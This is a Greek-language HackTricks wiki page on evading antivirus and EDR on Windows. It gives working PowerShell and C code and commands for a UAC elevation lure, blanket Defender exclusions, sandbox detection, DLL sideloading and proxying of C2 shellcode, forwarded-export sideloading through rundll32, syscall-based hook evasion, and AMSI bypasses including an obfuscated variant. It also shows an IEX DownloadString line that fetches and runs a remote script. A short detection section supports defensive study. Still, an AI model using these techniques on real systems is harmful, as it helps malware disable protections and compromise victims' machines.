# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από τον** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender, προσποιούμενο ότι είναι ένα άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Δόλωμα UAC τύπου installer πριν από την παραποίηση του Defender

Οι δημόσιοι loaders που μεταμφιέζονται σε cheats παιχνιδιών συχνά διανέμονται ως ανυπόγραφοι installers Node.js/Nexe, οι οποίοι πρώτα **ζητούν από τον χρήστη αυξημένα δικαιώματα** και μόνο μετά εξουδετερώνουν το Defender. Η διαδικασία είναι απλή:

1. Έλεγχος για δικαιώματα διαχειριστή με `net session`. Η εντολή πετυχαίνει μόνο όταν ο καλών έχει δικαιώματα admin, επομένως η αποτυχία υποδεικνύει ότι ο loader εκτελείται ως τυπικός χρήστης.
2. Άμεση επανεκκίνησή του με το ρήμα `RunAs`, ώστε να εμφανιστεί η αναμενόμενη προτροπή συναίνεσης UAC, διατηρώντας παράλληλα την αρχική γραμμή εντολών.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Τα θύματα πιστεύουν ήδη ότι εγκαθιστούν «σπασμένο» λογισμικό, επομένως συνήθως αποδέχονται την προτροπή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Καθολικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσουν αυξημένα δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender, αντί να απενεργοποιήσουν εντελώς την υπηρεσία. Αρχικά, ο loader τερματίζει τη διεργασία παρακολούθησης του GUI (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε να μην είναι δυνατή η σάρωση κάθε προφίλ χρήστη, καταλόγου συστήματος και αφαιρούμενου δίσκου:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε προσαρτημένο σύστημα αρχείων (D:\, E:\, USB sticks κ.λπ.), οπότε **οποιοδήποτε μελλοντικό payload αποθηκευτεί οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προνοητικός — οι attackers διατηρούν τη δυνατότητα να φορτώσουν αργότερα unsigned drivers χωρίς να χρειαστεί να πειράξουν ξανά το Defender.
- Όλες οι αλλαγές γίνονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε μεταγενέστερα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις εξακολουθούν να ισχύουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Εφόσον δεν διακόπτεται καμία υπηρεσία του Defender, οι απλοϊκοί έλεγχοι κατάστασης εξακολουθούν να αναφέρουν «το antivirus είναι ενεργό», παρόλο που η επιθεώρηση σε πραγματικό χρόνο δεν ελέγχει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Προς το παρόν, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis και, για τα πιο προηγμένα EDR, behavioural analysis.

### **Στατική ανίχνευση**

Η στατική ανίχνευση επιτυγχάνεται με τον εντοπισμό γνωστών κακόβουλων συμβολοσειρών ή ακολουθιών bytes σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, digital signatures, εικονίδιο, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών public tools μπορεί να οδηγήσει ευκολότερα στον εντοπισμό σας, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτού του είδους την ανίχνευση:

- **Κρυπτογράφηση**

Αν κρυπτογραφήσετε το binary, το AV δεν θα μπορεί να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος loader για να το αποκρυπτογραφήσει και να το εκτελέσει στη μνήμη.

- **Obfuscation**

Μερικές φορές αρκεί να αλλάξετε ορισμένες συμβολοσειρές στο binary ή στο script σας για να το παρακάμψετε από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακόβουλες signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε τη στατική ανίχνευση του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλαπλά τμήματα και ζητά από το Defender να σαρώσει το καθένα ξεχωριστά. Έτσι, μπορεί να σας δείξει ακριβώς ποιες συμβολοσειρές ή ποια bytes στο binary σας έχουν επισημανθεί.

Συνιστώ ανεπιφύλακτα να δείτε αυτή την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με το πρακτικό AV Evasion.

### **Δυναμική ανάλυση**

Δυναμική ανάλυση είναι όταν το AV εκτελεί το binary σας σε sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των κωδικών πρόσβασης του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό μπορεί να είναι λίγο πιο δύσκολο, αλλά υπάρχουν ορισμένα πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Αναμονή πριν από την εκτέλεση** Ανάλογα με την υλοποίησή της, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης της dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία χωρίς να διακόψουν τη ροή εργασίας του χρήστη, επομένως οι μεγάλες αναμονές μπορούν να εμποδίσουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παραλείψουν την αναμονή, ανάλογα με την υλοποίησή της.
- **Έλεγχος των πόρων του μηχανήματος** Συνήθως τα sandboxes διαθέτουν πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και την ταχύτητα των ανεμιστήρων, καθώς δεν θα είναι όλα διαθέσιμα στο sandbox.
- **Έλεγχοι ειδικοί για το μηχάνημα** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείτε να ελέγξετε το domain του υπολογιστή για να δείτε αν ταιριάζει με αυτό που έχετε ορίσει. Αν δεν ταιριάζει, μπορείτε να τερματίσετε το πρόγραμμά σας.

Αποδεικνύεται ότι το όνομα υπολογιστή του Microsoft Defender Sandbox είναι HAL9TH. Επομένως, μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν από την εκτέλεση. Αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του Defender, οπότε μπορείτε να τερματίσετε το πρόγραμμά σας.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμη πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως αναφέραμε προηγουμένως σε αυτή την ανάρτηση, τα **public tools** τελικά **εντοπίζονται**, οπότε θα πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή μπορείτε να χρησιμοποιήσετε κάποιο λιγότερο γνωστό project που επίσης κάνει dump το LSASS;

Η σωστή απάντηση είναι μάλλον η δεύτερη. Για παράδειγμα, το mimikatz είναι πιθανότατα ένα από τα πιο επισημασμένα malware από τα AV και EDR, αν όχι το πιο επισημασμένο. Το ίδιο το project είναι εξαιρετικό, αλλά είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AV. Επομένως, αναζητήστε εναλλακτικές λύσεις για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, φροντίστε να **απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων** στο Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να πετύχετε evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν ένα συγκεκριμένο AV εντοπίζει το payload σας, εγκαταστήστε το σε ένα VM, δοκιμάστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και κάντε εκεί δοκιμές μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, να **προτιμάτε πάντα τη χρήση DLLs για evasion**. Σύμφωνα με την εμπειρία μου, τα DLL files συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, οπότε είναι ένα πολύ απλό τέχνασμα για να αποφύγετε τον εντοπισμό σε ορισμένες περιπτώσεις (εφόσον το payload σας μπορεί να εκτελεστεί ως DLL, φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό εντοπισμού 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό εντοπισμού 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός συνηθισμένου Havoc EXE payload με ένα συνηθισμένο Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείτε να χρησιμοποιήσετε με DLL files για να γίνετε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-θύμα και τα κακόβουλα payloads δίπλα-δίπλα.

Μπορείτε να εντοπίσετε προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων μέσα στο "C:\Program Files\\" που είναι ευάλωτα σε DLL hijacking, καθώς και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που είναι ευάλωτα σε DLL Hijacking/Sideloading**. Αυτή η τεχνική είναι αρκετά stealthy όταν εκτελείται σωστά, αλλά αν χρησιμοποιήσετε δημοσίως γνωστά προγράμματα DLL Sideloadable, μπορεί να σας εντοπίσουν εύκολα.

Απλώς τοποθετώντας ένα κακόβουλο DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτωθεί το payload σας, καθώς το πρόγραμμα αναμένει συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό DLL μετονομασμένο.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με το [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν ποσοστό Detection 0/26 στο [antiscan.me](https://antiscan.me)! Θα το θεωρούσα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και [το βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθετε περισσότερα και να εμβαθύνετε σε όσα συζητήσαμε.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Οι ενότητες Windows PE μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι «forwarders»: αντί να δείχνει σε κώδικα, η καταχώριση export περιέχει μια συμβολοσειρά ASCII της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, ο Windows loader:

- Φορτώνει το `TargetDll`, αν δεν έχει φορτωθεί ήδη
- Επιλύει το `TargetFunc` από αυτό

Σημαντικές συμπεριφορές που πρέπει να γνωρίζετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο της ενότητας που εκτελεί την προώθηση.

Αυτό επιτρέπει μια έμμεση primitive sideloading: εντοπίστε ένα signed DLL που εξάγει μια συνάρτηση η οποία προωθείται σε όνομα ενότητας που δεν είναι KnownDLL και, στη συνέχεια, τοποθετήστε δίπλα του ένα DLL που ελέγχετε και έχει ακριβώς το ίδιο όνομα με την προωθούμενη ενότητα. Όταν κληθεί το forwarded export, ο loader επιλύει την προώθηση και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται σύμφωνα με την κανονική σειρά αναζήτησης.

PoC (αντιγραφή-επικόλληση):
1) Αντιγράψτε το υπογεγραμμένο DLL συστήματος σε έναν φάκελο με δικαίωμα εγγραφής
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Αρκεί ένα ελάχιστο `DllMain` για να επιτευχθεί code execution· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να εκτελεστεί το `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed συμπεριφορά:
- Το rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί την προώθηση προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν δεν έχει υλοποιηθεί το `SetAuditingInterface`, θα λάβετε σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Συμβουλές για το κυνήγι:
- Εστιάστε σε forwarded exports όπου το module-στόχος δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το inventory των Windows 11 forwarders για να αναζητήσετε υποψήφιες επιλογές: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για ανίχνευση/άμυνα:
- Παρακολουθείτε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν signed DLLs από μη system paths και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο base name από εκείνον τον κατάλογο
- Ειδοποιήστε για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε paths όπου μπορούν να γράψουν οι χρήστες
- Επιβάλετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε write+execute στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα toolkit payload για παράκαμψη EDRs με χρήση suspended processes, direct syscalls και εναλλακτικών μεθόδων εκτέλεσης`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealth τρόπο.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού: ό,τι λειτουργεί σήμερα μπορεί να εντοπιστεί αύριο, γι’ αυτό μη βασίζεστε ποτέ σε ένα μόνο εργαλείο. Αν είναι δυνατό, δοκιμάστε να συνδυάσετε πολλαπλές τεχνικές evasion.

## Direct/Indirect Syscalls & Επίλυση SSN (SysWhispers4)

Τα EDR συχνά τοποθετούν **inline hooks σε user mode** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελέσουν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές κλήσης:**
- **Direct (embedded)**: εκπέμπει μια εντολή `syscall`/`sysenter`/`SVC #0` στο stub που δημιουργείται (χωρίς να γίνεται hit σε export του `ntdll`).
- **Indirect**: μεταβαίνει σε ένα υπάρχον gadget `syscall` μέσα στο `ntdll`, ώστε η μετάβαση σε kernel mode να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για evasion ευρετικών μηχανισμών). Το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε κλήση.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο και εντοπίζει μια ακολουθία syscall κατά την εκτέλεση.

**Στρατηγικές επίλυσης SSN ανθεκτικές σε hooks:**
- **FreshyCalls (VA sort)**: συμπεραίνει τα SSN ταξινομώντας τα syscall stubs με βάση τις virtual addresses, αντί να διαβάζει τα bytes των stub.
- **SyscallsFromDisk**: αντιστοιχίζει ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSN από το `.text` του και έπειτα το αποδεσμεύει (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάζει την εξαγωγή SSN με ταξινόμηση VA και την επικύρωση opcode όταν ένα stub είναι καθαρό· αν εντοπιστεί hook, επιστρέφει στην εξαγωγή βάσει VA.
- **HW Breakpoint**: ορίζει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά την εκτέλεση, χωρίς να αναλύσει hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέπει το «[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)». Αρχικά, τα AV μπορούσαν να σαρώνουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα παρακάτω στοιχεία των Windows.

- User Account Control, ή UAC (ανύψωση δικαιωμάτων για εγκατάσταση EXE, COM, MSI ή ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Μακροεντολές Office VBA

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενό τους σε μορφή που δεν είναι ούτε κρυπτογραφημένη ούτε συσκοτισμένη.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την παρακάτω ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατήρησε πώς προσθέτει το `amsi:` και στη συνέχεια τη διαδρομή προς το εκτελέσιμο από το οποίο εκτελέστηκε το script, σε αυτήν την περίπτωση, το powershell.exe.

Δεν αποθηκεύσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από την **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και τη χρήση του `Assembly.Load(byte[])` για φόρτωση και εκτέλεση στη μνήμη. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για εκτέλεση στη μνήμη, αν θέλεις να παρακάμψεις το AMSI.

Υπάρχουν μερικοί τρόποι παράκαμψης του AMSI:

- **Obfuscation**

Καθώς το AMSI βασίζεται κυρίως σε στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείς να φορτώσεις μπορεί να είναι ένας καλός τρόπος αποφυγής του εντοπισμού.

Ωστόσο, το AMSI μπορεί να αποσυσκοτίζει scripts ακόμη κι αν έχουν πολλαπλά επίπεδα, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο υλοποίησής του. Αυτό κάνει την αποφυγή του όχι και τόσο απλή. Παρ' όλα αυτά, μερικές φορές αρκεί να αλλάξεις μερικά ονόματα μεταβλητών και είσαι εντάξει, οπότε εξαρτάται από το πόσο έχει επισημανθεί κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται με τη φόρτωση ενός DLL στη διεργασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι δυνατό να αλλοιωθεί εύκολα, ακόμη και όταν εκτελείται ως μη προνομιούχος χρήστης. Λόγω αυτού του ελαττώματος στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους αποφυγής της σάρωσης AMSI.

**Πρόκληση σφάλματος**

Η πρόκληση αποτυχίας κατά την αρχικοποίηση του AMSI (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για την τρέχουσα διεργασία. Αυτό αποκαλύφθηκε αρχικά από τον [Matt Graeber](https://twitter.com/mattifestation), και η Microsoft ανέπτυξε μια υπογραφή για να αποτρέψει την ευρύτερη χρήση του.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Αρκούσε μία γραμμή κώδικα PowerShell για να καταστήσει το AMSI άχρηστο στην τρέχουσα διεργασία PowerShell. Αυτή η γραμμή έχει φυσικά επισημανθεί από το ίδιο το AMSI, επομένως απαιτούνται ορισμένες τροποποιήσεις για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Να έχεις υπόψη ότι αυτή η ανάρτηση πιθανότατα θα επισημανθεί μόλις δημοσιευτεί, οπότε μην δημοσιεύσεις κώδικα αν σκοπεύεις να παραμείνεις μη εντοπίσιμος.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση της εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό για το E_INVALIDARG. Έτσι, το αποτέλεσμα της πραγματικής σάρωσης θα είναι 0, κάτι που ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διάβασε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές για την παράκαμψη του AMSI με powershell. Δες [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθεις περισσότερα.

### Αποκλεισμός του AMSI εμποδίζοντας τη φόρτωση του amsi.dll (hook στο LdrLoadDll)

Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στην τρέχουσα διεργασία. Μια ανθεκτική, ανεξάρτητη από τη γλώσσα παράκαμψη είναι η τοποθέτηση ενός hook σε user mode στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν η ζητούμενη μονάδα είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται σαρώσεις για αυτή τη διεργασία.<sup>[[23]](#references)</sup>

